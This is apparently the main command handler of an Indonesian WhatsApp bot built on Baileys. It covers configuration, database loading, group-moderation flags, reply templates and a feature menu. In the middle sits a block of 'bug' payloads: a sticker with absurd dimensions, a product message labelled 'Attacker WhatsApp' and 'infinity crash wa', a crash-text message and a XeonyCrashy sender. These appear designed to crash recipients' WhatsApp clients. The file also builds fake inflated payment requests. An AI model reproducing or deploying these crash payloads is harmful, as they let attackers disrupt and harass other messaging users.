require('./config')
const { WA_DEFAULT_EPHEMERAL, extractImageThumb, getAggregateVotesInPollMessage, URL_REGEX, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = global.baileys
const fs = require('fs')
const util = require('util')
let fetch = require('node-fetch');
const PDFDocument = require('pdfkit')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const sharp = require('sharp')
const jimp  = require('jimp')
const cheerio = require('cheerio')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator')
const yts = require('yt-search')
const { JSDOM } = require('jsdom')
const { color, bgcolor } = require('./lib/color')
const maker = require('mumaker')
const textpro = require('./lib/textpro')
const { tizi } = require('./lib/tizi');
const { weg } = require('./lib/weg');
const { vapi } = require('./lib/vapi.js');
const { philips } = require('./lib/philips.js');
const { apikey } = require('./apikey.json')
const { uptotelegra } = require('./lib/upload')
const { Primbon } = require('scrape-primbon')
const { Brainly } = require("brainly-scraper-v2");
const { translate } = require("@vitalets/google-translate-api")
const { Pixiv } = require('@ibaraki-douji/pixivts')
const { fileTypeFromBuffer } = require('file-type')
const pixiv = new Pixiv()
const googleTTS = require('google-tts-api')
const ytdl = require("ytdl-core")
const speed = require('performance-now')
const path = require('path')
const primbon = new Primbon()
const { Configuration, OpenAIApi } = require('openai')
const { exec, spawn, execSync } = require("child_process")
const { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
const { smsg, formatp, hitungmundur, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, generateProfilePicture, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
//=================================================//
// read database
let tebaklagu = JSON.parse(fs.readFileSync('./database/tebaklagu.json'))
let _family100 = JSON.parse(fs.readFileSync('./database/family100.json'))
let kuismath = JSON.parse(fs.readFileSync('./database/math.json'))
let tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
let tebakkata = JSON.parse(fs.readFileSync('./database/tebakkata.json'))
let caklontong = JSON.parse(fs.readFileSync('./database/lontong.json'))
let caklontong_desk = JSON.parse(fs.readFileSync('./database/lontong_desk.json'))
let tebakkalimat = JSON.parse(fs.readFileSync('./database/kalimat.json'))
let tebaklirik = JSON.parse(fs.readFileSync('./database/lirik.json'))
let tebaktebakan = JSON.parse(fs.readFileSync('./database/tebakan.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const premgc = JSON.parse(fs.readFileSync('./database/premiumgc.json'))
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const ntilinkall =JSON.parse(fs.readFileSync('./lib/antilinkall.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let ntilinkchannel =JSON.parse(fs.readFileSync('./database/antilinkchannelwa.json'));
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let nteval = JSON.parse(fs.readFileSync('./database/antieval.json'))
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
let antisticker = JSON.parse(fs.readFileSync('./database/antisticker.json'))
let antiviewonce = JSON.parse(fs.readFileSync('./database/viewonce.json'))
const banned = JSON.parse(fs.readFileSync('./database/banned.json'))
const thumb = fs.readFileSync(`./image/lol.jpg`)
const virusgambar = fs.readFileSync(`./image/virgam.jpeg`)


module.exports = conn = async (conn, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix


const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const arg = budy.slice(command.length + 2, budy.length)
const pushname = m.pushName || "No Name"
const botNumber = await conn.decodeJid(conn.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
let text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const { chats } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const isPrem = prem.includes(m.sender)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
const AntiLinkChannel = m.isGroup ? ntilinkchannel.includes(from) : false
const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
const AntiEval = m.isGroup ? nteval.includes(from) : false
const antiWame = m.isGroup ? ntwame.includes(from) : false
const AntiSticker = m.isGroup ? antisticker.includes(from) : false
const AntiViewOnce = m.isGroup ? antiviewonce.includes(from) : false
const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
const isPremgc = m.isGroup ? premgc.includes(from) : false
const isBan = banned.includes(m.sender)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal = moment(Date.now()).tz("Asia/Makassar").locale('id').format("dddd, ll")
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const qtod = m.quoted? "true":"false"
const vn = false
const timestampi = speed();
const latensii = speed() - timestampi
const totalStorage = Math.floor(os.totalmem() / 1024 / 1024) + 'MB'
const freeStorage = Math.floor(os.freemem() / 1024 / 1024) + 'MB'
const cpuModel = os.cpus()[0].model
const cpuSpeed = os.cpus()[0].speed / 1000
const cpuCount = os.cpus().length
const _uptime = process.uptime() * 1000
const uptime = clockString(_uptime)
const ini_mark = `0@s.whatsapp.net`
const dnew = new Date(Date.now())
//anti media
const isXeonMedia = m.mtype
const week = dnew.toLocaleDateString('in', {
               weekday: 'long'
            })
            const weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(dnew / 84600000) % 5]
            const date = dnew.toLocaleDateString('in', {
               day: 'numeric',
               month: 'long',
               year: 'numeric'
            })
            const dateIslamic = Intl.DateTimeFormat('in' + '-TN-u-ca-islamic', {
               day: 'numeric',
               month: 'long',
               year: 'numeric'
            }).format(dnew)
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
         if(time2 < "23:59:00"){
var shinchantime = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var shinchantime = `Selamat Malam 🌃`
 }
 if(time2 < "18:00:00"){
var shinchantime = `Selamat Sore 🌃`
 }
 if(time2 < "15:00:00"){
var shinchantime = `Selamat Sore 🌅`
 }
 if(time2 < "11:00:00"){
var shinchantime = `Selamat Siang 🌄`
 }
 if(time2 < "05:00:00"){
var shinchantime = `Selamat Pagi 🌄`
 } 
 
 //total fitur
const totalFitur = () =>{
            var mytext = fs.readFileSync("./main.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
//fake quoted
const ftroli = {
         key: {
            fromMe: false,
            "participant": "0@s.whatsapp.net",
            "remoteJid": "status@broadcast"
         },
         "message": {
            orderMessage: {
               itemCount: 7777777,
               status: 200,
               surface: 200,
               message: `© ${ownername}`,
               orderTitle: 'memek',
               sellerJid: '0@s.whatsapp.net'
            }
         },
         contextInfo: {
            "forwardingScore": 999,
            "isForwarded": true
         },
         sendEphemeral: true
      }
const fkontak = {
         key: {
            participant: `0@s.whatsapp.net`,
            ...(from ? {
               remoteJid: `status@broadcast`
            } : {})
         },
         message: {
            'contactMessage': {
               'displayName': `${pushname}`,
               'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
               'jpegThumbnail': thumb,
               thumbnail: thumb,
               sendEphemeral: true
            }
         }
      }
      const fbugstik = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AnrD-A1QmqzujA1cup-mlu8IZA25t9JgmpQepFY9Rn6z.enc'",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 999999999,
"width": 999999999,
"directPath": "/v/t62.15575-24/30929805_648615486894459_9146693700573396349_n.enc?ccb=11-4&oh=01_AVwP9-aotKL3M5xo84ruYmFJof6hpjvTaHtWrOLdvzhkxw&oe=632E77C8",
"fileLength": "999999999",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}
const fbugtoko = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": thumb //Gambarnye
},
"title": `👿ᴬᵗᵗᵃᶜᵏᵉʳ ᵂʰᵃᵗˢᴬᵖᵖ👿`, //Kasih namalu 
"description": "⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ", 
"retailerId": "XD",
"productImageCount": 999999999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}
const fbugtext = {
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: {
        "extendedTextMessage": {
        "text": `${weg}\n${weg}`
        }
        }
        }
const blue = { 
key: {
            fromMe: false,
            "participant": "0@s.whatsapp.net",
            "remoteJid": "status@broadcast"
         },
'message': {
"interactiveMessage": {
"body": {
"text": `${ownername}`,
"hasMediaAttachment": [],
"jpegThumbnail": thumb,
},
"nativeFlowMessage": {
"buttons": [
				{
"name": "review_and_pay",
"buttonParamsJson": '{"currency":"IDR","total_amount":{"value":2023,"offset":100},"reference_id": "6348642505244872","order":{"status": "completed","items":[{"retailer_id": "6348642505244872","name": "","amount":{"value":10000,"offset":100},"quantity":7777777}]}}'
}
]
}
}}}
const fpayment = {
         key: {
            fromMe: false,
            "participant": "0@s.whatsapp.net",
            "remoteJid": "status@broadcast"
         },
         message: {
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "10000000000",
"requestFrom": m.sender,
"noteMessage": {
"extendedTextMessage": {
"text": `𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏`,
}
}}}}
const shinuwu = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": [],
"jpegThumbnail": thumb,
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": '{"currency":"USD","payment_configuration":"","payment_type":"","transaction_id":"","total_amount":{"value":879912500,"offset":100},"reference_id":"4N88TZPXWUM","type":"physical-goods","payment_method": "","order":{"status":"pending","description":"","subtotal":{"value":990000000,"offset":100},"tax":{"value":8712000,"offset":100},"discount":{"value":118800000,"offset":100},"shipping":{"value":500,"offset":100},"order_type":"ORDER","items":[{"retailer_id":"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0","name":"ShinChan","amount":{"value":1000000,"offset":100},"quantity":99},{"retailer_id":"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4","name":"Anak","amount":{"value":5000000,"offset":100},"quantity":99},{"retailer_id":"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3","name":"Ganteng","amount":{"value":4000000,"offset":100},"quantity":99}]},"additional_note":"anu"}',
contextInfo:{mentionedJid:[sender]}
}
]
}
}
}}
//BUG NEW
const newbugaha = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `ShinChan Uwu`
}}
}
async function XeonyCrashy(dgxeon,chat) {
conn.sendMessage(chat, {
document: {url: './config.js'},
mimetype: `image/null`,
fileName: `tes` ,
caption: `tes`,
}, {quoted: newbugaha })
}
//end bug functions
//===================SHINCHAN XD=========================//
if (vn) {
let allct = await store.chats.all().map(v => v.id)
if (m.message && m) {
if (vn === false) return
for (let jid of allct) {
conn.sendPresenceUpdate('composing', jid)
setTimeout(() => {
conn.sendPresenceUpdate('composing', jid)
}, 25000)
setTimeout(() => {
conn.sendPresenceUpdate('composing', jid)
}, 50000)
setTimeout(() => {
conn.sendPresenceUpdate('composing', jid)
}, 75000)
setTimeout(() => {
conn.sendPresenceUpdate('composing', jid)
}, 95000)
}
}
}
//===================SHINCHAN XD=========================//
const paycall = (teks) => {
var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": 'call',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${teks}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(m.chat, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
/*const paytod = (teks) => {
let me = m.sender
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "INR",
"amount1000": "10000000000",
"requestFrom": m.sender,
"noteMessage": {
"extendedTextMessage": {
"text": `${teks}`,
}
}}}), { userJid: m.chat, quoted: fkontak })
conn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}*/
const paytod = (teks) => {
var paymentod = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'INR',
      amount1000: 99999 * 1000,
      requestFrom: m.sender,
      noteMessage: {
      extendedTextMessage: {
      text: teks,
      contextInfo: {
      mentionedJid: [m.sender],
      externalAdReply: {
      showAdAttribution: true
      }}}}}}
      conn.relayMessage(m.chat, paymentod, {})
      }
//===================REPLY NYA=========================//
const reply = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `𝙏𝙐𝙉𝙂𝙂𝙐 𝙔𝘼🤗`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/0e2b5f224fdcaf4b61d02.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})}
const replybrainly = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `𝘽𝙍𝘼𝙄𝙉𝙇𝙔📖`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/8cd68dfc3fa902010e0e6.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})}
const replyhentai = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `🥵𝙉𝙃𝙀𝙉𝙏𝘼𝙄 𝙎𝙀𝘼𝙍𝘾𝙃🥵`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/b2d62575b1b5cadaeb1e2.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})}
const replyerror = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `𝙔𝘼𝙃 𝙀𝙍𝙍𝙊𝙍😭`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `𝙀𝙍𝙍𝙊𝙍 404 𝘽𝙔: ${global.ownername}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/39ebef0bfdf46f18cb2ff.png',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})} 
const replytolak = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `𝘼𝙘𝙘𝙚𝙨𝙨 𝘿𝙚𝙣𝙞𝙚𝙙 ❌`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `𝙋𝙀𝙍𝙈𝙄𝙉𝙏𝘼𝘼𝙉 𝘼𝙉𝘿𝘼 𝘿𝙄𝙏𝙊𝙇𝘼𝙆`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/8b1580614b17b92955133.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})} 
const ytreply = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `🐼𝙔𝙊𝙐𝙏𝙐𝘽𝙀 𝙎𝙀𝘼𝙍𝘾𝙃🐼`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/97f426edef5a6326065a9.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})} 
const spotifyreply = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `🐣𝙎𝙋𝙊𝙏𝙄𝙁𝙔 𝙎𝙀𝘼𝙍𝘾𝙃🐣`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://www.scdn.co/i/_global/open-graph-default.png',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})} 

const replybokep = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `🥵𝙓𝙉𝙓𝙓 𝙎𝙀𝘼𝙍𝘾𝙃🥵`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/6bdd8ea22025d0afe0497.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})} 
const replyxvideos = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `🥵𝙓𝙑𝙄𝘿𝙀𝙊𝙎 𝙎𝙀𝘼𝙍𝘾𝙃🥵`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/dd0982ab9d4d655335a7d.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})} 
const replysimi = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `🐣𝗔𝗸𝘂 𝙎𝙞𝙢𝙎𝙞𝙢𝙞🐣`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/25cc613088dbb0bf49bae.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})} 
const replyguru = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `📖𝗥𝗢𝗕𝗢𝗧 𝗚𝗨𝗥𝗨📖`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/7f3f33cee047a2c20854b.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})} 
const replydltt = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙄𝙉𝙂 𝙏𝙄𝙆𝙏𝙊𝙆...`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/00636535720e2815a9868.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})} 
//==========================================================//

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
//document randomizer
let documents = [doc1,doc2,doc3,doc4,doc5,doc6,doc7,doc8,doc9,doc10,doc11,doc12,doc13]
let docs = pickRandom(documents)

//menu nya
stod = `${sender}`
var mundur = await hitungmundur(4, 23)
const menulist = `*Hay ${pushname} 👋*
${shinchantime}
Saya ©ɴᴇʀᴏʙᴏᴛ yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━
╰┈➤「 \`\`\`𝑫𝑨𝑻𝑨𝑩𝑨𝑺𝑬\`\`\` 」
━━━━━━━━━━━━━━━━━━━
Status : ${isCreator ? 'Owner' : 'User'}
Nama : ${pushname}
Nomor : @${m.sender.split('@')[0]}
Sponsored :  @${ini_mark.split('@')[0]}
Prefix :   ${prefix}
━━━━━━━━━━━━━━━━━━━
╰┈➤「 \`\`\`𝑺𝑻𝑨𝑻𝑼𝑺 𝑩𝑶𝑻\`\`\` 」
━━━━━━━━━━━━━━━━━━━
[•]Speed : ${latensii.toFixed(4)} Second
[•]ᴀᴋᴛɪғ sᴇʟᴀᴍᴀ : ${uptime}
[•]Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
[•]Hostname : ${os.hostname()}
[•]Platform : ${os.platform()}
[•]Total Storage: ${totalStorage}
[•]Free Storage: ${freeStorage}
[•]CPU Model: ${cpuModel}
[•]CPU Speed: ${cpuSpeed} GHz
[•]Number of CPU Cores: ${cpuCount}
[•]Type : Node.Js
[•]Baileys : @whiskeysockets/baileys@^6.6.0
[•]Total Fitur : ${totalFitur()}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑹𝑬𝑨𝑳 𝑻𝑰𝑴𝑬 )
━━━━━━━━━━━━━━━━━━━
𝐇𝐚𝐫𝐢: ${week} ${weton}
𝐓𝐚𝐧𝐠𝐠𝐚𝐥: ${date}
𝐉𝐚𝐦: ${time}
𝐉𝐚𝐦: ${wita}
𝐉𝐚𝐦: ${wit}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
━━━━━━━━━━━━━━━━━━━
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿 )
━━━━━━━━━━━━━━━━━━━
➤ pindl (download pinterest)
➤ pixiv (perlu code pixiv)
➤ spotify (link Spotify)
